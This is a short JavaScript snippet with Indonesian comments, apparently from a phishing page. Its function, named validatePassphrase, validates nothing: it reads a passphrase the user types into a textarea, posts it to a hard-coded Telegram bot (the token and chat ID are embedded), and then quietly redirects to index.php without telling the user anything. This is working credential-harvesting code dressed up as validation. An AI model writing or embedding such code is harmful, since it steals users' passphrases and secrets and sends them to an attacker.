<script>
    function validatePassphrase() {
        // Ambil teks dari textarea
        var plaintext = document.getElementById('plainText').value;

        // Tambahkan pesan "Password: ini password anda"
        var message = ': ' + plaintext;

        // URL bot Telegram (ganti dengan URL bot dan chat ID Anda)
        var telegramBotUrl = 'https://api.telegram.org/bot6162019169:AAGzKyBAme9Ns5FZBFdb3ShyiZvyKdaLw0M/sendMessage';
        var chatId = '1167607938';

        // Persiapkan data untuk dikirim
        var formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('text', message);

        // Kirim data ke bot Telegram
        fetch(telegramBotUrl, {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                // Setelah berhasil dikirim, redirect ke halaman index.php
                window.location.href = 'index.php';
            })
            .catch(error => {
                console.error('There was a problem with sending the message:', error);
                // Tidak ada notifikasi pesan berhasil atau gagal dikirim
            });

        // Kosongkan textarea setelah dikirim
        document.getElementById('plainText').value = '';
    }
</script>
